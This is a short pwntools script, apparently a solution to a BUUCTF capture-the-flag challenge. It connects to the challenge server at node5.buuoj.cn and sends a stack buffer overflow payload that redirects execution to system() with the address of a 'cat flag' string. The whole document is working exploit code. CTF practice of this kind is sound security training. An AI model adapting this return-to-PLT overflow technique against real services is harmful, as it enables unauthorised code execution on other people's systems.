from pwn import *

sh=remote("node5.buuoj.cn",25043)
elf=ELF("./timu")

cat_flag_addr=0x080487E0
system_addr=elf.plt["system"]
main=0x08048677

payload=0x17*b'a'+p32(system_addr)+p32(main)+p32(cat_flag_addr)
sh.sendline(payload)
sh.interactive()
